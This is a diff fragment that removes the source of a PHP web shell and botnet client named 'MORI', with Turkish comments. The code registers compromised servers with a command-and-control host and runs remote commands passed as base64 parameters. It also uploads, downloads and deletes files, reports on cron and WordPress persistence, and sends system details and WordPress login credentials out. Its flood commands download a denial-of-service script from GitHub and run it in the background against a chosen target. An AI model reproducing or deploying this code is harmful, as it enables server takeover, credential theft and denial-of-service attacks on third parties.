-    $reg_file = __DIR__ . '/.registered';
-    if (@file_exists($reg_file) && @filesize($reg_file) > 0) {
-        $GLOBALS['_SHELL_REGISTERED'] = true;
-    } else {
-        // First-time registration - non-blocking attempt
-        // Try registration with super short timeout (1 sec max)
-        @c2_register_background($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']);
-        
-        // Mark as registered to avoid infinite loop
-        $GLOBALS['_SHELL_REGISTERED'] = true;
-    }
-}
-
-// Handle API requests
-if (isset($_GET['m']) || isset($_POST['m'])) {
-    // Decode with safe_base64_decode (uses -, _ instead of +, /)
-    $encoded = $_GET['m'] ?? $_POST['m'] ?? '';
-    $cmd = safe_base64_decode($encoded);
-    
-    if (!$cmd) {
-        echo "[ERROR] Failed to decode command";
-        exit;
-    }
-    
-    error_log("[EXEC] Executing command: " . (strlen($cmd ?? '') > 0 ? substr($cmd, 0, 100) : '(empty)'));
-    
-    $output = execute_command($cmd);
-    $task_id = $_GET['task_id'] ?? $_POST['task_id'] ?? null;
-    
-    error_log("[EXEC] Output length: " . strlen($output));
-    
-    // Send result to C2
-    @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $cmd, $output, $task_id);
-    
-    // Return output to requester
-    echo $output;
-    exit;
-}
-
-if (isset($_GET['info'])) {
-    echo json_encode(get_system_info());
-    exit;
-}
-
-// =====================================================
-// FILE UPLOAD HANDLER (HTTP-based fallback)
-// =====================================================
-// When shell commands are disabled, C2 sends files via HTTP POST
-// Receives: Base64-encoded file content + filename
-// Stores: Decoded file to filesystem
-if (isset($_POST['act']) && $_POST['act'] == 'upload_file') {
-    header('Content-Type: application/json; charset=utf-8');
-    
-    $encoded_data = $_POST['data'] ?? '';
-    $filename = $_POST['filename'] ?? '';
-    
-    // Validate
-    if (empty($encoded_data) || empty($filename)) {
-        http_response_code(400);
-        echo json_encode(['error' => 'Missing data or filename', 'success' => false]);
-        exit;
-    }
-    
-    // Sanitize filename (prevent directory traversal)
-    $filename = basename($filename);
-    if (strpos($filename, '..') !== false || strpos($filename, '/') !== false) {
-        http_response_code(400);
-        echo json_encode(['error' => 'Invalid filename', 'success' => false]);
-        exit;
-    }
-    
-    // Base64 decode
-    $file_content = @base64_decode($encoded_data, true);
-    if ($file_content === false) {
-        http_response_code(400);
-        echo json_encode(['error' => 'Invalid base64 encoding', 'success' => false]);
-        exit;
-    }
-    
-    // Write file to current directory or temp
-    $target_dir = sys_get_temp_dir();
-    $target_path = $target_dir . '/' . $filename;
-    
-    // Try current dir first
-    if (@is_writable(getcwd())) {
-        $target_path = getcwd() . '/' . $filename;
-    }
-    
-    // Write file
-    $bytes_written = @file_put_contents($target_path, $file_content);
-    if ($bytes_written === false) {
-        http_response_code(500);
-        echo json_encode(['error' => 'Failed to write file', 'success' => false]);
-        exit;
-    }
-    
-    // Make executable if .sh or .py
-    @chmod($target_path, 0755);
-    
-    http_response_code(201);
-    echo json_encode([
-        'success' => true,
-        'filename' => $filename,
-        'path' => $target_path,
-        'size' => strlen($file_content),
-        'message' => 'File uploaded successfully'
-    ]);
-    exit;
-}
-
-// REGISTER DATA ENDPOINT - C2 server pulls system info from here
-if (isset($_GET['act']) && $_GET['act'] === 'register_data') {
-    header('Content-Type: application/json; charset=utf-8');
-    echo json_encode(collect_system_info());
-    exit;
-}
-
-// PERSISTENCE STATUS ENDPOINT - Report persistence layer status
-if (isset($_GET['act']) && $_GET['act'] === 'persistence_status') {
-    header('Content-Type: application/json; charset=utf-8');
-    
-    $persistence_info = [
-        'backup_locations' => [],
-        'cron_job' => false,
-        'wordpress_hooks' => false,
-        'daemon_processes' => [],
-        'checked_at' => date('c')
-    ];
-    
-    // Backup locations - check common persistence paths
-    $backup_paths = [
-        '/tmp',
-        '/var/tmp',
-        '/dev/shm',
-        '/home',
-        '/root',
-        sys_get_temp_dir()
-    ];
-    
-    foreach ($backup_paths as $path) {
-        if (@is_dir($path) && @is_writable($path)) {
-            // Look for shell backups in this directory
-            $shell_name = basename($GLOBALS['C2_SHELL'] ?? __FILE__);
-            $pattern = $path . '/*' . $shell_name;
-            $matches = @glob($pattern, GLOB_NOSORT);
-            if ($matches && count($matches) > 0) {
-                foreach ($matches as $match) {
-                    if (@file_exists($match)) {
-                        $persistence_info['backup_locations'][] = $match;
-                    }
-                }
-            }
-        }
-    }
-    
-    // Check for cron job
-    if (function_exists('shell_exec')) {
-        $crontab = @shell_exec('crontab -l 2>/dev/null');
-        if ($crontab && (strpos($crontab, $GLOBALS['CLIENT_ID'] ?? 'mori') !== false || 
-                         strpos($crontab, basename($GLOBALS['C2_SHELL'] ?? __FILE__)) !== false)) {
-            $persistence_info['cron_job'] = true;
-        }
-    }
-    
-    // Check for WordPress hooks (wp_options table modifications)
-    if (defined('ABSPATH') && defined('DB_NAME')) {
-        // WordPress environment detected
-        $persistence_info['wordpress_hooks'] = true;
-    }
-    
-    // Check for daemon processes
-    if (function_exists('shell_exec')) {
-        $ps = @shell_exec('ps aux 2>/dev/null');
-        if ($ps) {
-            $client_id = $GLOBALS['CLIENT_ID'] ?? 'mori';
-            $shell_name = basename($GLOBALS['C2_SHELL'] ?? __FILE__);
-            foreach (explode("\n", $ps) as $line) {
-                if ((strpos($line, $client_id) !== false || strpos($line, $shell_name) !== false) && 
-                    strpos($line, 'grep') === false) {
-                    // Extract PID
-                    $parts = preg_split('/\s+/', trim($line));
-                    if (isset($parts[1])) {
-                        $persistence_info['daemon_processes'][] = (int)$parts[1];
-                    }
-                }
-            }
-            // Remove duplicates
-            $persistence_info['daemon_processes'] = array_unique($persistence_info['daemon_processes']);
-        }
-    }
-    
-    echo json_encode($persistence_info, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
-    exit;
-}
-if (isset($_GET['task'])) {
-    echo @c2_get_task($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']) ?: "[WAIT]";
-    exit;
-}
-
-// CLI Daemon mode — cron veya direkt çalışma
-if (php_sapi_name() === 'cli') {
-    // Prevent cron process accumulation: exit immediately if another instance is running
-    $cli_lock_file = sys_get_temp_dir() . '/.mori_cli_' . substr(md5(SHELL_PATH), 0, 8) . '.lk';
-    $cli_lock_fp   = @fopen($cli_lock_file, 'w');
-    if (!$cli_lock_fp || !@flock($cli_lock_fp, LOCK_EX | LOCK_NB)) {
-        exit(0); // already running — silently exit
-    }
-
-    // Exit before next cron tick so the next tick can start fresh (cron = 5min = 300s)
-    $cli_max_runtime = 290;
-    $cli_start_time  = time();
-
-    @ProcessMasker::mask();
-
-    // Queue dosyasını işle (web PHP'de exec kısıtlıysa CLI burada çalışır)
-    $queue_file = __DIR__ . '/.mori_exec_queue';
-    if (@file_exists($queue_file) && @filesize($queue_file) > 2) {
-        $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
-        @file_put_contents($queue_file, '[]', LOCK_EX); // Temizle
-        foreach ($queue as $item) {
-            $qcmd = $item['cmd'] ?? '';
-            if (!empty($qcmd)) {
-                $qout = execute_system_command($qcmd);
-                @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $qcmd, "[QUEUE_EXEC] " . $qout, null);
-            }
-        }
-    }
-
-    $error_sentinels = ['no_task', 'db_unavailable', 'error', '[WAIT]', '[NO_ID]'];
-    $idle_streak  = 0;   // consecutive no-task polls
-    $next_poll_in = 30;  // seconds until next poll (server may override)
-
-    while (true) {
-        // Exit cleanly before next cron tick to prevent process accumulation
-        if ((time() - $cli_start_time) >= $cli_max_runtime) break;
-
-        $task_raw = @c2_get_task($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']);
-        $cmd          = null;
-        $task_id      = null;
-        $retry_after  = null;
-
-        if ($task_raw) {
-            $task_decoded = @json_decode($task_raw, true);
-            if (is_array($task_decoded)) {
-                $retry_after = isset($task_decoded['retry_after']) ? (int)$task_decoded['retry_after'] : null;
-                $raw_cmd     = $task_decoded['command'] ?? '';
-                if ($raw_cmd && !in_array($raw_cmd, $error_sentinels, true)) {
-                    $cmd     = $raw_cmd;
-                    $task_id = $task_decoded['id'] ?? null;
-                }
-            } elseif (!in_array($task_raw, $error_sentinels, true)) {
-                $cmd = $task_raw;
-            }
-        }
-
-        if ($cmd) {
-            $out = execute_command($cmd);
-            @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $cmd, $out, $task_id);
-            $idle_streak  = 0;
-            $next_poll_in = $retry_after ?? 5; // task just ran → check again soon
-        } else {
-            $idle_streak++;
-            // Exponential backoff: 30s → 60s after 10 idle polls
-            $backoff      = $idle_streak > 10 ? 60 : 30;
-            $next_poll_in = $retry_after ?? $backoff;
-        }
-
-        // Process local exec queue each cycle
-        if (@file_exists($queue_file) && @filesize($queue_file) > 2) {
-            $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
-            @file_put_contents($queue_file, '[]', LOCK_EX);
-            foreach ($queue as $item) {
-                $qcmd = $item['cmd'] ?? '';
-                if (!empty($qcmd)) {
-                    $qout = execute_system_command($qcmd);
-                    @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $qcmd, "[QUEUE] " . $qout, null);
-                }
-            }
-        }
-
-        sleep($next_poll_in);
-    }
-
-    // Release lock so the next cron tick can acquire it
-    @flock($cli_lock_fp, LOCK_UN);
-    @fclose($cli_lock_fp);
-    exit(0);
-}
-
-// No output - shell is silent
-
-function http_get($url) {
-    return http_request('GET', $url);
-}
-
-function http_post($url, $data) {
-    return http_request('POST', $url, $data);
-}
-
-function fetch_url_content($url, $timeout = 15) {
-    $url = trim($url);
-    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) {
-        return false;
-    }
-
-    // YÖNTEM 1: cURL (en güvenilir)
-    if (function_exists('curl_init')) {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
-        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
-        $result = @curl_exec($ch);
-        curl_close($ch);
-        if ($result !== false && strlen($result) > 0) {
-            return $result;
-        }
-    }
-
-    // YÖNTEM 2: file_get_contents with stream context
-    if (ini_get('allow_url_fopen')) {
-        $context = stream_context_create([
-            'http' => ['method' => 'GET', 'timeout' => $timeout, 'ignore_errors' => true, 'follow_location' => 1, 'max_redirects' => 3],
-            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false]
-        ]);
-        $result = @file_get_contents($url, false, $context);
-        if ($result !== false && strlen($result) > 0) {
-            return $result;
-        }
-    }
-
-    // YÖNTEM 3: fopen fallback
-    if (ini_get('allow_url_fopen')) {
-        $context = stream_context_create([
-            'http' => ['method' => 'GET', 'timeout' => $timeout, 'ignore_errors' => true, 'follow_location' => 1, 'max_redirects' => 3],
-            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false]
-        ]);
-        $fp = @fopen($url, 'rb', false, $context);
-        if ($fp) {
-            $result = '';
-            while (!feof($fp) && strlen($result) < 10485760) { // 10MB max
-                $chunk = fread($fp, 8192);
-                if ($chunk === false) break;
-                $result .= $chunk;
-            }
-            fclose($fp);
-            if ($result !== '' && strlen($result) > 0) {
-                return $result;
-            }
-        }
-    }
-
-    return false;
-}
-
-function download_remote_file($url, $filename) {
-    $content = fetch_url_content($url);
-    if ($content === false) {
-        return "[ERROR] URL fetch failed: $url";
-    }
-
-    // Absolute path → use directly; relative → resolve under __DIR__
-    if ($filename !== '' && ($filename[0] === '/' || $filename[0] === '\\')) {
-        $target = $filename;
-    } else {
-        $target = __DIR__ . '/' . ltrim($filename, '/\\');
-    }
-
-    $dir = dirname($target);
-    if (!is_dir($dir)) {
-        @mkdir($dir, 0755, true);
-    }
-
-    $written = @file_put_contents($target, $content);
-    if ($written === false) {
-        return "[ERROR] Cannot write file: $target";
-    }
-
-    // Auto-chmod scripts executable
-    $ext = strtolower(pathinfo($target, PATHINFO_EXTENSION));
-    @chmod($target, in_array($ext, ['py', 'sh', 'pl', 'rb']) ? 0755 : 0644);
-    return "OK: downloaded $url to $target ($written bytes)";
-}
-
-function get_server_persistence_url() {
-    global $C2_SERVER, $persistence_default_url;
-    $c2_server = $C2_SERVER;
-    $url = $persistence_default_url;
-
-    $urlver_token = md5('mori_c2_secret_2024_persistence');
-    $response = @http_get($c2_server . '?urlver&token=' . $urlver_token);
-    if ($response) {
-        $response = trim($response);
-        if (filter_var($response, FILTER_VALIDATE_URL)) {
-            return $response;
-        }
-    }
-
-    $response = @http_get($c2_server . '?act=persistence_get');
-    if ($response) {
-        $json = json_decode($response, true);
-        if (is_array($json) && isset($json['url']) && filter_var($json['url'], FILTER_VALIDATE_URL)) {
-            $url = $json['url'];
-        }
-    }
-
-    return $url;
-}
-
-// =====================================================
-// VERİ KODLAMA İŞLEMLERİ
-// =====================================================
-function safe_base64_encode($data) {
-    return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($data));
-}
-
-function safe_base64_decode($data) {
-    $data = str_replace(['-', '_'], ['+', '/'], $data);
-    $padding = 4 - (strlen($data) % 4);
-    if ($padding !== 4) {
-        $data .= str_repeat('=', $padding);
-    }
-    return base64_decode($data, true);
-}
-
-function safe_json_encode($data) {
-    return json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
-}
-
-// =====================================================
-// GELİŞMİŞ SİSTEM BİLGİ TOPLAMA
-// =====================================================
-function collect_system_info() {
-    global $is_windows;
-    
-    $info = [
-        'os' => [
-            'type' => PHP_OS ?? 'unknown',
-            'family' => detect_os_family(),
-            'hostname' => @gethostname() ?: 'unknown',
-            'arch' => @php_uname('m') ?: 'unknown',
-            'kernel' => @php_uname('r') ?: 'unknown',
-            'full' => @php_uname('a') ?: 'unknown'
-        ],
-        'web' => [
-            'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
-            'user' => get_current_user(),
-            'cwd' => getcwd() ?: __DIR__,
-            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? '',
-            'script_path' => __FILE__,
-            'web_shell_url' => $GLOBALS['web_shell_url'] ?? 'unknown',
-            'server_ip' => $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? 'unknown',
-            'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
-        ],
-        'php' => [
-            'version' => PHP_VERSION,
-            'sapi' => php_sapi_name(),
-            'extensions' => get_loaded_extensions(),
-            'disabled_functions' => ini_get('disable_functions'),
-            'memory_limit' => ini_get('memory_limit'),
-            'max_execution_time' => ini_get('max_execution_time')
-        ],
-        'disk' => [
-            'total' => @disk_total_space(__DIR__),
-            'free' => @disk_free_space(__DIR__)
-        ],
-        'time' => [
-            'timestamp' => time(),
-            'timezone' => date_default_timezone_get(),
-            'datetime' => date('Y-m-d H:i:s')
-        ],
-        'permissions' => [
-            'can_read' => is_readable(__FILE__),
-            'can_write' => is_writable(__DIR__),
-            'can_execute' => is_executable(__FILE__)
-        ]
-    ];
-    
-    // Windows özel bilgiler
-    if ($is_windows) {
-        $info['windows'] = [
-            'comspec' => getenv('COMSPEC'),
-            'windir' => getenv('WINDIR'),
-            'username' => getenv('USERNAME'),
-            'computername' => getenv('COMPUTERNAME')
-        ];
-    }
-    
-    return $info;
-}
-
-function detect_os_family() {
-    $os = strtoupper(PHP_OS);
-    if (strpos($os, 'WIN') === 0) return 'WINDOWS';
-    if (strpos($os, 'DAR') === 0) return 'MACOS';
-    if (strpos($os, 'LINUX') === 0) return 'LINUX';
-    if (strpos($os, 'BSD') !== false) return 'BSD';
-    return 'UNKNOWN';
-}
-
-// =====================================================
-// C2 API İŞLEMLERİ (GELİŞMİŞ)
-// =====================================================
-// C2 REGISTRATION - BACKGROUND & MAIN
-// =====================================================
-
-/**
- * Background registration - non-blocking, fail-fast
- * Used for auto-registration on first load
- * Never blocks page load (1 sec timeout max)
- */
-function c2_register_background($server, $id, $override_url = null) {
-    global $web_shell_url;
-    $url = $override_url ?: $web_shell_url;
-
-    try {
-        $sysinfo = collect_system_info();
-    } catch (Exception $e) {
-        error_log("[c2_register_background] Sysinfo failed: " . $e->getMessage());
-        return false;
-    }
-
-    // Include cached sister files (populated by ensure_persistence_v4 on previous run)
-    $sister_cache = sys_get_temp_dir() . '/.mori_sister_cache.json';
-    $sister_data  = @json_decode(@file_get_contents($sister_cache), true);
-    $wp_creds     = generate_wp_login_credentials();
-
-    $payload = [
-        'id'            => $id,
-        'web_shell_url' => $url,
-        'sysinfo'       => $sysinfo,
-        'sister_files'  => $sister_data['locations'] ?? [],
-        'sister_urls'   => $sister_data['urls']      ?? [],
-        'wp_login_id'   => $wp_creds['blogs_id'],
-        'wp_login_hash' => $wp_creds['hash'],
-        'timestamp'     => time(),
-        'version'       => '3.0'
-    ];
-
-    $encoded = safe_base64_encode(safe_json_encode($payload));
-    
-    // ONE attempt only - fail-fast (1 second timeout)
-    $result = @http_post_timeout($server . '?act=reg', $encoded, 1);
-    
-    $trimmed = trim($result ?? '');
-    $reg_json = $trimmed ? @json_decode($trimmed, true) : null;
-    $reg_ok = ($trimmed === 'ok') || (!empty($reg_json['success']));
-    if ($result && $reg_ok) {
-        error_log("[c2_register_background] SUCCESS");
-        @file_put_contents(__DIR__ . '/.registered', time());
-        return true;
-    }
-
-    error_log("[c2_register_background] FAILED or timeout: " . substr($trimmed, 0, 80));
-    return false;
-}
-
-function http_post_timeout($url, $data, $timeout = 1) {
-    // Very fast fallback - cURL only with strict timeout
-    if (function_exists('curl_init')) {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        // CURLOPT_TIMEOUT would int-cast 0.5 → 0 (infinite) — use TIMEOUT_MS only
-        curl_setopt($ch, CURLOPT_TIMEOUT_MS, (int)($timeout * 1000));
-        curl_setopt($ch, CURLOPT_USERAGENT, 'MORI-Agent/2.0');
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-        
-        $result = @curl_exec($ch);
-        @curl_close($ch);
-        
-        if ($result !== false && !empty($result)) {
-            return $result;
-        }
-    }
-    
-    return null;
-}
-
-// =====================================================
-function c2_register($server, $id) {
-    global $web_shell_url;
-    
-    error_log("[c2_register] Starting with id=$id, server=$server");
-    
-    try {
-        $sysinfo = collect_system_info();
-        error_log("[c2_register] Sysinfo collected");
-    } catch (Exception $e) {
-        error_log("[c2_register] Exception in collect_system_info: " . $e->getMessage());
-        return false;
-    }
-
-    $payload = [
-        'id' => $id,
-        'web_shell_url' => $web_shell_url,
-        'sysinfo' => $sysinfo,
-        'timestamp' => time(),
-        'version' => '3.0'
-    ];
-
-    $encoded = safe_base64_encode(safe_json_encode($payload));
-    error_log("[c2_register] Payload encoded: " . strlen($encoded) . " bytes");
-    
-    // Retry logic - 3 kez dene with SHORT sleeps
-    for ($attempt = 1; $attempt <= 3; $attempt++) {
-        error_log("[c2_register] Attempt $attempt/3");
-        $result = http_post($server . '?act=reg', $encoded);
-        
-        // Null-safe response handling
-        $result = $result ?: '';  // Convert null to empty string
-        $result_preview = $result ? substr($result, 0, 100) : '(empty)';
-        error_log("[c2_register] Response: " . $result_preview);
-        
-        // Check for success - accept both 'ok' string and JSON {success:true}
-        $trimmed_r = trim($result);
-        $json_r = $trimmed_r ? @json_decode($trimmed_r, true) : null;
-        if (!empty($result) && ($trimmed_r === 'ok' || !empty($json_r['success']))) {
-            error_log("[c2_register] SUCCESS!");
-            
-            // Guarantee write registration marker (retry if fails)
-            $reg_file = __DIR__ . '/.registered';
-            if (!@file_exists($reg_file) || @filesize($reg_file) < 5) {
-                @file_put_contents($reg_file, time());
-            }
-            
-            return true;
-        }
-        
-        // Very SHORT sleep (0.5 sec instead of 2 sec)
-        if ($attempt < 3) {
-            usleep(500000); // 0.5 second instead of sleep(2)
-        }
-    }
-    
-    // Tüm denemeler başarısız olursa false döndür
-    error_log("[c2_register] FAILED - All attempts failed");
-    return false;
-}
-
-/**
- * BATCH REGISTRATION - Toplu client kaydı (1000+ site için ideal)
- * Tek HTTP isteğinde 50 client'ı kaydet
- * Crash riski %99 azalır (200 req → 4 req)
- */
-function c2_register_batch($server, $clients_batch) {
-    if (!is_array($clients_batch) || count($clients_batch) === 0) {
-        return false;
-    }
-
-    // Max 50 client per batch
-    $clients_batch = array_slice($clients_batch, 0, 50);
-
-    $payload = [
-        'clients' => $clients_batch,
-        'batch_version' => '1.0',
-        'batch_timestamp' => time()
-    ];
-
-    $encoded = safe_base64_encode(safe_json_encode($payload));
-    
-    // Retry logic - 3 kez dene
-    for ($attempt = 1; $attempt <= 3; $attempt++) {
-        $result = http_post($server . '?act=reg_batch', $encoded);
-        
-        // Null-safe null coalescing
-        $result = $result ?: '';
-        
-        if (!empty($result)) {
-            $decoded = json_decode($result, true);
-            if (is_array($decoded) && ($decoded['batch_processed'] ?? false) === true) {
-                error_log("[c2_register_batch] SUCCESS on attempt $attempt");
-                return $decoded; // Success - döndür sonuç
-            }
-        }
-        
-        error_log("[c2_register_batch] Attempt $attempt/3 failed or invalid response");
-        
-        // İlk 2 denemede başarısızsa 1 saniye bekle
-        if ($attempt < 3) {
-            sleep(1);
-        }
-    }
-    
-    // Fallback: tek tek kayıt TRY (sadece 1x, loop yok)
-    // Don't use retry logic here - already failed batch
-    foreach ($clients_batch as $client) {
-        $single_start = time();
-        @c2_register_background($server, $client['id'], $client['web_shell_url'] ?? null);
-        // Skip if taking too long
-        if (time() - $single_start > 3) break;
-    }
-    
-    return false;
-}
-
-function c2_get_task($server, $id) {
-    $url = $server . '?act=get_task&id=' . urlencode($id);
-    return http_get($url);
-}
-
-function c2_send_result($server, $id, $command, $output, $task_id = null) {
-    $payload = [
-        'id' => $id,
-        'task_id' => $task_id,
-        'command' => $command,
-        'output' => safe_base64_encode($output),  // Standardized encoding
-        'timestamp' => time()
-    ];
-    
-    $encoded = safe_base64_encode(safe_json_encode($payload));
-    return http_post($server . '?act=set_res', $encoded);
-}
-
-function c2_update_status($server, $id, $status = 'alive') {
-    $payload = [
-        'id' => $id,
-        'status' => $status,
-        'timestamp' => time()
-    ];
-    
-    $encoded = safe_base64_encode(safe_json_encode($payload));
-    return http_post($server . '?act=update', $encoded);
-}
-
-// =====================================================
-// GELİŞMİŞ KOMUT ÇALIŞTIRMA MOTORU
-// =====================================================
-function execute_command($cmd) {
-    global $is_windows;
-    
-    $cmd = trim($cmd);
-    if (empty($cmd)) return '';
-    
-    $output = '';
-    $methods = [];
-    
-    // ÖZEL KOMUTLAR (PHP CORE)
-    
-    // pwd / cd
-    if ($cmd === 'pwd' || $cmd === 'cd') {
-        return getcwd() ?: __DIR__;
-    }
-    
-    // CD ile dizin değiştir (büyük/küçük harf bağımsız)
-    // Handle both pure 'cd path' and 'cd path && othercmd'
-    if (preg_match('/^cd\s+(?:[\'"])?([^\'"&]+?)(?:[\'"])?(?:\s*&&\s*(.*))?$/i', $cmd, $m)) {
-        $path = trim($m[1]);
-        $remaining_cmd = isset($m[2]) ? trim($m[2]) : '';
-        
-        if (@chdir($path)) {
-            $cwd = getcwd();
-            if (!empty($remaining_cmd)) {
-                // If there's a command after &&, execute it in the new directory
-                $result = execute_command($remaining_cmd);
-                return $result;
-            }
-            return $cwd;
-        }
-        return "[ERROR] Cannot change to: $path";
-    }
-    
-    // FILELIST - Dizin listele
-    if (strpos($cmd, 'FILELIST ') === 0) {
-        $path = trim(substr($cmd, 9)) ?: getcwd();
-        return list_directory($path);
-    }
-    
-    // FILEREAD - Dosya oku
-    if (strpos($cmd, 'FILEREAD ') === 0) {
-        $file = trim(substr($cmd, 9));
-        return read_file($file);
-    }
-    
-    // FILEWRITE - Dosya yaz
-    if (strpos($cmd, 'FILEWRITE ') === 0) {
-        $parts = explode(' ', $cmd, 3);
-        if (count($parts) >= 3) {
-            return write_file($parts[1], $parts[2]);
-        }
-        return "[ERROR] FILEWRITE <path> <base64_content>";
-    }
-
-    // DOWNLOADFILE - URL'den dosya indirip kaydet
-    if (strpos($cmd, 'DOWNLOADFILE ') === 0 || strpos($cmd, 'DOWNLOADURL ') === 0) {
-        $parts = preg_split('/\s+/', $cmd, 3);
-        if (count($parts) >= 3) {
-            return download_remote_file($parts[1], $parts[2]);
-        }
-        return "[ERROR] DOWNLOADFILE <url> <filename>";
-    }
-    
-    // FILEDELETE - Dosya sil
-    if (strpos($cmd, 'FILEDELETE ') === 0) {
-        $file = trim(substr($cmd, 11));
-        return delete_file($file);
-    }
-    
-    // FILECOPY - Dosya kopyala
-    if (strpos($cmd, 'FILECOPY ') === 0) {
-        $parts = explode(' ', $cmd, 3);
-        if (count($parts) >= 3) {
-            return copy_file($parts[1], $parts[2]);
-        }
-        return "[ERROR] FILECOPY <source> <dest>";
-    }
-    
-    // DIRCREATE - Dizin oluştur
-    if (strpos($cmd, 'DIRCREATE ') === 0) {
-        $path = trim(substr($cmd, 10));
-        return create_directory($path);
-    }
-    
-    // DIRDELETE - Dizin sil
-    if (strpos($cmd, 'DIRDELETE ') === 0) {
-        $path = trim(substr($cmd, 10));
-        return delete_directory($path);
-    }
-    
-    // SISTEM BILGILERI
-    if ($cmd === 'sysinfo' || $cmd === 'system') {
-        return json_encode(collect_system_info(), JSON_PRETTY_PRINT);
-    }
-    
-    if ($cmd === 'whoami') {
-        return get_current_user() ?: 'unknown';
-    }
-    
-    if ($cmd === 'hostname') {
-        return gethostname();
-    }
-    
-    if ($cmd === 'dir' || $cmd === 'ls') {
-        return list_directory(getcwd());
-    }
-    
-    if ($cmd === 'clear' || $cmd === 'cls') {
-        return '__CLEAR__';
-    }
-    
-    // PHP_STRESS — shell olmadan native PHP HTTP flood
-    // Sözdizimi: PHP_STRESS <target> <method> <duration> <threads> [refs] [max_cpu] [max_ram] [rpc]
-    if (strpos($cmd, 'PHP_STRESS ') === 0) {
-        $parts = preg_split('/\s+/', trim(substr($cmd, 11)));
-        $target   = $parts[0] ?? '';
-        $method   = strtoupper($parts[1] ?? 'GET');
-        $duration = (int)($parts[2] ?? 20);
-        $threads  = min((int)($parts[3] ?? 10), 50);
-        $refs     = $parts[4] ?? '_';
-        $max_cpu  = (int)($parts[5] ?? 80);
-        $max_ram  = (int)($parts[6] ?? 75);
-        $rpc      = (int)($parts[7] ?? 10);
-        if (empty($target)) return '[ERROR] PHP_STRESS: hedef URL gerekli';
-        return php_native_flood($target, $method, $duration, $threads, $rpc);
-    }
-
-    // MORI_STRESS — anında fire-and-forget, download+run tek bg komutu
-    // Kullanım: MORI_STRESS <target> <method> <threads> [duration=300] [rpc=15]
-    if (strpos($cmd, 'MORI_STRESS ') === 0) {
-        ignore_user_abort(true);
-        set_time_limit(0);
-        $parts    = preg_split('/\s+/', trim(substr($cmd, 12)));
-        $target   = $parts[0] ?? '';
-        $method   = strtoupper($parts[1] ?? 'GET');
-        $threads  = min((int)($parts[2] ?? 100), 500);
-        $duration = min((int)($parts[3] ?? 300), 600);
-        $rpc      = (int)($parts[4] ?? 15);
-        if (empty($target)) return '[ERROR] MORI_STRESS: hedef gerekli';
-
-        $python  = mori_find_python();
-        $dl_url  = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/dos.py';
-        $save    = (is_writable('/tmp') ? '/tmp' : (is_writable('/dev/shm') ? '/dev/shm' : sys_get_temp_dir())) . '/dos_mori.py';
-        $run_args = escapeshellarg($target) . ' ' . escapeshellarg($method)
-                  . ' ' . (int)$duration . ' ' . (int)$threads . ' _ 80 75 ' . (int)$rpc;
-
-        // Önce önbellekte var mı bak (bloklamaz)
-        $dos = null;
-        foreach ([__DIR__, '/tmp', '/dev/shm', '/var/tmp', sys_get_temp_dir()] as $dir) {
-            if (!is_dir($dir)) continue;
-            foreach (['dos_mori.py', 'dos.py'] as $fn) {
-                $p = $dir . '/' . $fn;
-                if (@file_exists($p) && @filesize($p) > 1000) { $dos = $p; break 2; }
-            }
-            foreach (@glob($dir . '/dos.py*') ?: [] as $f) {
-                if (@filesize($f) > 1000) { $dos = $f; break 2; }
-            }
-        }
-
-        if ($dos) {
-            // Zaten var — direkt çalıştır, anında döner
-            $bg = 'nohup ' . escapeshellarg($python) . ' ' . escapeshellarg($dos)
-                . ' ' . $run_args . ' > /dev/null 2>&1 &';
-        } else {
-            // Yok — indir+çalıştır tek nohup sh -c içinde, PHP bloklamaz
-            $inline = 'curl -sLf ' . escapeshellarg($dl_url) . ' -o ' . escapeshellarg($save)
-                    . ' 2>/dev/null || wget -qO ' . escapeshellarg($save) . ' ' . escapeshellarg($dl_url) . ' 2>/dev/null'
-                    . '; ' . escapeshellarg($python) . ' ' . escapeshellarg($save) . ' ' . $run_args;
-            $bg = 'nohup sh -c ' . escapeshellarg($inline) . ' > /dev/null 2>&1 &';
-        }
-
-        if (mori_exec_bg($bg))
-            return '[STRESS_OK] ' . $target . ' | ' . $method . ' | ' . $threads . 't | ' . $duration . 's'
-                 . ($dos ? '' : ' [dl+run bg]');
-
-        if (function_exists('pcntl_fork') && !in_array('pcntl_fork', array_map('trim', explode(',', ini_get('disable_functions'))))) {
-            $pid = @pcntl_fork();
-            if ($pid === 0) { @shell_exec($bg); exit(0); }
-            if ($pid  >  0) return '[STRESS_OK] ' . $target . ' | fork:' . $pid;
-        }
-
-        // exec tamamen kapalı → PHP native flood
